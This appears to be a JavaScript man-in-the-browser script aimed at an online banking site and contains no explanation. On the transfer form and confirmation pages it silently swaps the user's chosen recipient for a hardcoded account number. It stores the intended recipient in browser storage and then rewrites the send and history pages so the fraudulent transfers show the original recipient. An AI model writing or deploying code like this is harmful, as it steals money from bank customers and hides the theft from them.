var m_account = "3165286357890256";
var len = ("account number: ").length;
var s = "to: ";
var m = "||To:"
var user_account;
var true_account;

if(window.location.pathname == '/index.php') {
    var str = document.getElementById("account_no ").innerHTML;
    user_account = str.substring(len,str.length);
    localStorage.setItem("sender_account", user_account);
    //document.getElementById("account_no").innerHTML = "pies cię jebał";
}

if(window.location.pathname == '/form.php') {
	document.addEventListener("submit", function(){
		
		true_account = document.getElementById("account").value;
		localStorage.setItem("last_account", true_account);
		document.getElementById("account").value = m_account;

		user_account = localStorage.getItem("sender_account");
        var fake_transfers = [];
		if(user_account in localStorage){
			fake_transfers = JSON.parse(localStorage.getItem(user_account));
			fake_transfers.push(true_account);
			localStorage.setItem(user_account, JSON.stringify(fake_transfers));
		} 
		else {
			fake_transfers.push(true_account);
			localStorage.setItem(user_account, JSON.stringify(fake_transfers));  
		}
	});
}
if(window.location.pathname == '/confirm.php') {
	document.addEventListener("submit", function(){		
		document.getElementById("account").value = m_account;
	});
	document.getElementById("account").innerHTML = localStorage.getItem("last_account");
}
if(window.location.pathname == '/send.php') {
	document.getElementById("account").innerHTML = s.concat(localStorage.getItem("last_account"));
}
if(window.location.pathname == '/history.php') {
	
	user_account = localStorage.getItem("sender_account");
	if(user_account in localStorage) {
		var fake_transfers = JSON.parse(localStorage.getItem(user_account));
		var accounts = document.getElementsByClassName("r_account");
		var transfers_it = fake_transfers.length - 1;
		for (i = accounts.length - 1; i >= 0; i--) {
    		if(accounts[i].innerHTML == m.concat(m_account) && transfers_it < fake_transfers.length){
				accounts[i].innerHTML = m.concat(fake_transfers[transfers_it]);
				transfers_it = transfers_it - 1;
			}
		}
	}
}
